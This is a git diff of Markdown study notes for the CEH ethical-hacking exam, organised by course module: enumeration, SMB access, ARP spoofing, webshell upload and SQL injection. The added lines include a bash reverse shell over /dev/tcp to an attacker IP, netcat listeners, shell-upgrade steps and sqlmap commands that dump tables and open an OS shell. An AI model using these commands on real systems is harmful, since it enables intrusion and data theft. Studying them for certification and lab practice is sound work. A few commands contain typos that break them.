@@ -1,4 +1,4 @@
-# CEH-notes
+# Notas
 Module 2 – Footprinting and Reconnaissance 
 
 ¨ DNS
@@ -87,6 +87,8 @@ portscan (ack, syn,… metasploit)
 	uniscan -u http://10.10.10.16:8080/CEH -q – scans for web directories. 10.10.10.16 is the IP of Windows Server 2016. -u switch is used to provide the target URL. -q switch is used to scan the directories in the web server. - we can replace the “-q” with -we for file check and -d for dynamic scan.
 
 	gobuster dir -w /usr/share/wordlists/dirb/common.tx -u 10.129.216.40
+	
+	gobuster dir --url http://{TARGET_IP}/ --wordlist/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
 
 	nmap -sV --script=http-enum www.goodshopping.com - the target here is www.goodshopping.com
 
@@ -166,9 +168,9 @@ Module 5 – Vulnerability Analisis
 
 	Nessus-> Policies-> Advanced scan. 
 
-¨ Searchsploiot
+¨ Searchsploit
 
-¨ John Hammond
+¨ linPEAS
 
 ¨ Nikto
 
@@ -231,8 +233,12 @@ Module 6 – System Hacking
 	arpspoof -i eth0 -t 10.10.10.1 10.10.10.10 - -i specifies network interface and -t specifies the target IP add 
 
 ¨ MAC Spoof 
-TMAC 
-SMAC
+	TMAC 
+	SMAC
+
+¨ SMB
+	sudo apt install smbclient > smbclient -L {IP} -U Administrator > smbclient \\\\10.10.10.131\\C$ -U Administrator
+	smbclient -N -L \\\\{TARGET_IP}\\ (no password
 
 ¨ Other tools and notes
 L0phtCrack(pass crack & audit)
@@ -306,6 +312,11 @@ Module 14 – Hacking Web Applications
 	weevely generate toor /home/attacker/Desktop/shell.php 
 	> go to website and upload the file.
 	> session might be established 
+	/usr/share/webshells/
+	> go to website and upload the file.
+	> nc the port
+	> python3 -c 'import pty;pty.spawn("/bin/bash")'
+	> session might be established C
 
 ¨ Detect Sniffing 
 
@@ -324,6 +335,15 @@ Module 15 – SQL Injection
 	sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie="cookies xxx" -D moviescope -T User_Login –dump - Dump Data
 
 	sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie="cookies xxx" --os-shell - OS Shell to execute commands
+	
+	sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie="cookies xxx" --os-shell - OS Shell to execute commands
+	> nc
+	> bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"
+	>python3 -c 'import pty;pty.spawn("/bin/bash")'
+	>CTRL+Z
+	>stty raw -echo
+	>fg
+	>export TERM=xterm
 
 ¨ Other
 
